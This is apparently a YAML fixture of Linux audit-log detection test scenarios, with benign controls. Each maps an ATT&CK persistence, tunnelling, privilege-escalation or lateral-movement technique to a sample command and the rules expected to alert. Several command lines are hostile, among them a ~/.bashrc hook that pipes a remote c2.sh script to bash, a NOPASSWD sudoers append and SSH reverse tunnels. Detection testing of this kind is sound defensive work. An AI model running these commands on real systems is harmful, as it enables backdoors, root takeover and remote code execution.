scenarios:
  - id: cron_persistence_interactive_shell
    name: Cron persistence from an interactive shell
    description: >
      An authenticated user writes a cron drop-in from an interactive Bash
      session to establish recurring execution.
    technique_id: T1053.003
    platform: linux
    log_source: linux_audit
    count: 1
    host: linux-workstation-01
    user: attacker
    user_id: 1000
    audit_user_id: 1000
    terminal: pts0
    exe: /usr/bin/bash
    parent_comm: bash
    command_line: >-
      bash -c 'echo "*/5 * * * * root /tmp/update.sh"
      > /etc/cron.d/system-update'
    expect:
      rules: [linux_cron_persistence_interactive_shell]
      min_alerts: 1

  - id: benign_crontab_listing
    name: Benign Cron listing from an interactive shell
    description: An authenticated user lists crons.
    technique_id: null
    platform: linux
    log_source: linux_audit
    count: 1
    host: linux-workstation-01
    user: user_01
    user_id: 1000
    audit_user_id: 1000
    terminal: pts0
    exe: /usr/bin/crontab
    parent_comm: bash
    command_line: crontab -l
    expect:
      id: benign_linux_cron_listing
      rules: []
      min_alerts: 0
      max_alerts: 0
      must_not_match: [linux_cron_persistence_interactive_shell]

  - id: ssh_remote_tunneling
    name: Tunneling via SSH remote forward
    description: >
      An authenticated user launches SSH remote port forwarding (-R) from an
      interactive shell to expose a remote service through the compromised host.
    technique_id: T1572
    platform: linux
    log_source: linux_audit
    count: 1
    host: web-prod-01
    user: deploy
    user_id: 1001
    audit_user_id: 1001
    terminal: pts0
    exe: /usr/bin/ssh
    parent_comm: bash
    command_line: ssh -R 4444:203.0.113.99:2222 user@example.com
    expect:
      rules: [linux_audit_ssh_remote_forward]
      min_alerts: 1

  - id: ssh_remote_forward
    name: SSH remote port forwarding
    description: >
      Attacker establishes a reverse tunnel (-R) through a compromised host to
      expose an internal service or maintain C2 after interactive shell access.
    technique_id: T1572
    platform: linux
    log_source: linux_audit
    count: 1
    host: web-prod-01
    user: deploy
    user_id: 1001
    audit_user_id: 1001
    terminal: pts0
    exe: /usr/bin/ssh
    parent_comm: bash
    command_line: >-
      ssh -N -f -R 8443:127.0.0.1:443 user@203.0.113.200
      -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
    expect:
      rules: [linux_audit_ssh_remote_forward]
      min_alerts: 1

  - id: ssh_proxyjump_tunnel
    name: SSH ProxyJump through bastion
    description: >
      From an interactive shell, an operator reaches an internal host by
      jumping through a bastion (ProxyJump), tunneling traffic via an SSH proxy.
    technique_id: T1090
    platform: linux
    log_source: linux_audit
    count: 1
    host: web-prod-02
    user: deploy
    user_id: 1001
    audit_user_id: 1001
    terminal: pts0
    exe: /usr/bin/ssh
    parent_comm: bash
    command_line: >-
      ssh -J deploy@bastion.example.com
      -o StrictHostKeyChecking=no user@10.0.0.25
    expect:
      rules: [linux_audit_ssh_proxy_tunnel]
      min_alerts: 1

  # --- 5 additional Persistence / C2 cases ---

  # tested log generation functionality by removing scenario yaml for
  # systemd_timer_persistence t1053.006
  - id: systemd_timer_persistence
    name: Systemd user timer persistence
    description: >
      Attacker drops a systemd user timer for recurring execution after gaining
      an interactive shell (Scheduled Task/Job - Systemd Timers).
    technique_id: T1053.006
    platform: linux
    log_source: linux_audit
    count: 1
    host: linux-workstation-01
    user: attacker
    user_id: 1000
    audit_user_id: 1000
    terminal: pts0
    exe: /usr/bin/bash
    parent_comm: bash
    command_line: >-
      bash -c 'echo -e "[Timer]\nOnCalendar=*:0/5\n[Install]\nWantedBy=timers.target"
      > ~/.config/systemd/user/update.timer'
    expect:
      rules: [linux_audit_systemd_timer_persistence]
      min_alerts: 1

  - id: bashrc_persistence
    name: Bashrc persistence hook
    description: >
      Attacker appends a remote payload launcher to ~/.bashrc so future logins
      re-establish control (Event Triggered Execution - Unix Shell Configuration).
    technique_id: T1546.004
    platform: linux
    log_source: linux_audit
    count: 1
    host: linux-workstation-01
    user: attacker
    user_id: 1000
    audit_user_id: 1000
    terminal: pts0
    exe: /usr/bin/bash
    parent_comm: bash
    command_line: >-
      bash -c 'echo "curl -fsSL http://185.220.101.42/c2.sh | bash" >> ~/.bashrc'
    expect:
      rules: [linux_audit_bashrc_persistence]
      min_alerts: 1

  - id: ssh_dynamic_socks_forward
    name: SSH dynamic SOCKS forward
    description: >
      Attacker opens an SSH dynamic port forward (-D) to proxy C2 or browse
      through the compromised host (Protocol Tunneling).
    technique_id: T1572
    platform: linux
    log_source: linux_audit
    count: 1
    host: web-prod-01
    user: deploy
    user_id: 1001
    audit_user_id: 1001
    terminal: pts0
    exe: /usr/bin/ssh
    parent_comm: bash
    command_line: ssh -N -f -D 9050 user@203.0.113.200
    expect:
      rules: [linux_audit_ssh_remote_forward]
      min_alerts: 1

  - id: ssh_proxycommand_tunnel
    name: SSH ProxyCommand tunnel
    description: >
      Attacker forces SSH through an HTTP CONNECT proxy using ProxyCommand to
      hide C2 traffic (Proxy).
    technique_id: T1090
    platform: linux
    log_source: linux_audit
    count: 1
    host: web-prod-02
    user: deploy
    user_id: 1001
    audit_user_id: 1001
    terminal: pts0
    exe: /usr/bin/ssh
    parent_comm: bash
    command_line: >-
      ssh -o ProxyCommand="nc -X connect -x 203.0.113.50:8080 %h %p"
      user@10.0.0.25
    expect:
      rules: [linux_audit_ssh_proxy_tunnel]
      min_alerts: 1

  # --- Privilege Escalation ---

  - id: sudo_interactive_root_shell
    name: Sudo interactive root shell
    description: >
      From an interactive shell, the operator escalates to root with sudo -i
      (Abuse Elevation Control Mechanism: Sudo and Sudo Caching).
    technique_id: T1548.003
    platform: linux
    log_source: linux_audit
    count: 1
    host: linux-workstation-01
    user: attacker
    user_id: 1000
    audit_user_id: 1000
    terminal: pts0
    exe: /usr/bin/sudo
    parent_comm: bash
    command_line: sudo -i
    expect:
      rules: [linux_audit_sudo_privesc]
      min_alerts: 1

  - id: sudo_su_root
    name: Sudo su to root
    description: >
      Interactive sudo su - to spawn a root login shell after a low-priv
      foothold.
    technique_id: T1548.003
    platform: linux
    log_source: linux_audit
    count: 1
    host: linux-workstation-01
    user: attacker
    user_id: 1000
    audit_user_id: 1000
    terminal: pts0
    exe: /usr/bin/sudo
    parent_comm: bash
    command_line: sudo su -
    expect:
      rules: [linux_audit_sudo_privesc]
      min_alerts: 1

  - id: chmod_suid_binary
    name: Setuid bit on a world-writable binary
    description: >
      Attacker marks a dropped binary setuid root so later execution runs as
      the file owner (Setuid and Setgid).
    technique_id: T1548.001
    platform: linux
    log_source: linux_audit
    count: 1
    host: linux-workstation-01
    user: attacker
    user_id: 1000
    audit_user_id: 1000
    terminal: pts0
    exe: /usr/bin/chmod
    parent_comm: bash
    command_line: chmod u+s /tmp/.kworker
    expect:
      rules: [linux_audit_suid_chmod]
      min_alerts: 1

  - id: pkexec_root_shell
    name: Pkexec spawn root shell
    description: >
      Polkit pkexec is used from an interactive terminal to launch a root
      shell (Abuse Elevation Control Mechanism).
    technique_id: T1548
    platform: linux
    log_source: linux_audit
    count: 1
    host: linux-workstation-01
    user: attacker
    user_id: 1000
    audit_user_id: 1000
    terminal: pts0
    exe: /usr/bin/pkexec
    parent_comm: bash
    command_line: pkexec /bin/bash
    expect:
      rules: [linux_audit_pkexec_shell]
      min_alerts: 1

  - id: sudoers_nopasswd
    name: NOPASSWD sudoers drop-in
    description: >
      Attacker appends a NOPASSWD rule to /etc/sudoers so future commands
      run as root without a password prompt.
    technique_id: T1548.003
    platform: linux
    log_source: linux_audit
    count: 1
    host: linux-workstation-01
    user: attacker
    user_id: 1000
    audit_user_id: 1000
    terminal: pts0
    exe: /usr/bin/bash
    parent_comm: bash
    command_line: >-
      bash -c 'echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
    expect:
      rules: [linux_audit_sudoers_modify]
      min_alerts: 1

  - id: benign_sudo_package_update
    name: Benign sudo package update
    description: An operator uses sudo to refresh packages, not to spawn a root shell.
    technique_id: null
    platform: linux
    log_source: linux_audit
    count: 1
    host: linux-workstation-01
    user: user_01
    user_id: 1000
    audit_user_id: 1000
    terminal: pts0
    exe: /usr/bin/sudo
    parent_comm: bash
    command_line: sudo apt-get update
    expect:
      id: benign_linux_sudo_apt
      rules: []
      min_alerts: 0
      max_alerts: 0
      must_not_match: [linux_audit_sudo_privesc]

  # --- Lateral Movement ---

  - id: ssh_internal_host
    name: SSH to an internal host
    description: >
      From a compromised workstation, the operator SSHes to an RFC1918 host
      (Remote Services: SSH).
    technique_id: T1021.004
    platform: linux
    log_source: linux_audit
    count: 1
    host: linux-workstation-01
    user: attacker
    user_id: 1000
    audit_user_id: 1000
    terminal: pts0
    exe: /usr/bin/ssh
    parent_comm: bash
    command_line: >-
      ssh -o StrictHostKeyChecking=no attacker@10.20.30.40
    expect:
      rules: [linux_audit_ssh_lateral]
      min_alerts: 1

  - id: ssh_stolen_private_key
    name: SSH with a private key from /tmp
    description: >
      Lateral SSH using a private key staged in /tmp rather than the user
      keyring (Remote Services: SSH).
    technique_id: T1021.004
    platform: linux
    log_source: linux_audit
    count: 1
    host: linux-workstation-01
    user: attacker
    user_id: 1000
    audit_user_id: 1000
    terminal: pts0
    exe: /usr/bin/ssh
    parent_comm: bash
    command_line: ssh -i /tmp/.id_rsa root@10.20.30.42
    expect:
      rules: [linux_audit_ssh_stolen_key]
      min_alerts: 1

  - id: scp_to_internal_host
    name: SCP payload to an internal host
    description: >
      Attacker copies a payload to another internal host over SSH (Lateral
      Tool Transfer).
    technique_id: T1570
    platform: linux
    log_source: linux_audit
    count: 1
    host: linux-workstation-01
    user: attacker
    user_id: 1000
    audit_user_id: 1000
    terminal: pts0
    exe: /usr/bin/scp
    parent_comm: bash
    command_line: >-
      scp -o StrictHostKeyChecking=no /tmp/payload.sh
      deploy@10.20.30.41:/tmp/payload.sh
    expect:
      rules: [linux_audit_scp_rsync_lateral]
      min_alerts: 1

  - id: rsync_to_internal_host
    name: Rsync tools to an internal host
    description: >
      Attacker mirrors a tool directory onto a peer over SSH (Lateral Tool
      Transfer).
    technique_id: T1570
    platform: linux
    log_source: linux_audit
    count: 1
    host: linux-workstation-01
    user: attacker
    user_id: 1000
    audit_user_id: 1000
    terminal: pts0
    exe: /usr/bin/rsync
    parent_comm: bash
    command_line: rsync -e ssh /tmp/tools/ deploy@10.20.30.43:/tmp/tools/
    expect:
      rules: [linux_audit_scp_rsync_lateral]
      min_alerts: 1

  - id: benign_ssh_to_github
    name: Benign SSH to GitHub
    description: Developer SSHes to GitHub, not an internal RFC1918 host.
    technique_id: null
    platform: linux
    log_source: linux_audit
    count: 1
    host: linux-workstation-01
    user: user_01
    user_id: 1000
    audit_user_id: 1000
    terminal: pts0
    exe: /usr/bin/ssh
    parent_comm: bash
    command_line: ssh git@github.com
    expect:
      id: benign_linux_ssh_github
      rules: []
      min_alerts: 0
      max_alerts: 0
      must_not_match:
        - linux_audit_ssh_lateral
        - linux_audit_ssh_stolen_key
        - linux_audit_ssh_remote_forward
